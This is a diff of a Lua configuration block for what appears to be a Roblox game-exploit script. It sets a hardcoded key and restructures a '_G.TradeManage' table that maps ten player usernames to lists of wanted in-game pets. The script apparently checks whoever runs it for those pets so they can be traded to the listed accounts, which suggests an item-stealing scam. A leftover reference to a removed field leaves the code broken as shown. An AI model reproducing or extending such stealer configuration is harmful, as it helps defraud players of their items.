@@ -44,28 +44,37 @@ end
 
 getgenv().KEY = "NASACOMPUTER888"
 _G.TradeManage = {
-    Target = {
-        "KingSentz645770",
-        "OrvilleuMoEfH",
-        "SafiyaAlShafee72",
-        "NoahXShop",
-        "Ayoshipship",
-	"zaq12wsx4z",
-	"19111993k",
-	"Taylor117k",
-	"oreosandmilk2q",
-	"Minecraft_1u"
-    },
-    Pet = {
-	"French Fry Ferret",
-        "Corrupted Kitsune",
-        "Kitsune",
-	"Raiju",
-        "Mimic Octopus",
-        "Dragonfly",
-	"Disco Bee",
-	"Butterfly",
-        "Dilophosaurus"
+    TargetConfigs = {
+        ["KingSentz645770"] = {
+            wantedPets = {"French Fry Ferret", "Corrupted Kitsune", "Kitsune"}
+        },
+        ["OrvilleuMoEfH"] = {
+            wantedPets = {"Corrupted Kitsune", "Kitsune"} 
+        },
+        ["SafiyaAlShafee72"] = {
+            wantedPets = {"Mimic Octopus"}
+        },
+        ["NoahXShop"] = {
+            wantedPets = {"Dragonfly"}
+        },
+	["Ayoshipship"] = {
+            wantedPets = {"Corrupted Kitsune"}
+        },
+        ["zaq12wsx4z"] = {
+            wantedPets = {"Red Fox", "Brontosaurus"} 
+        },
+        ["19111993k"] = {
+            wantedPets = {"Spaghetti Sloth"}
+        },
+        ["Taylor117k"] = {
+            wantedPets = {"Capybara"}
+        },
+	["oreosandmilk2q"] = {
+            wantedPets = {"Capybara"}
+        },
+        ["Minecraft_1u"] = {
+            wantedPets = {"Capybara"} 
+        }
     }
 }
 if hasTargetPet(_G.TradeManage.Pet) then
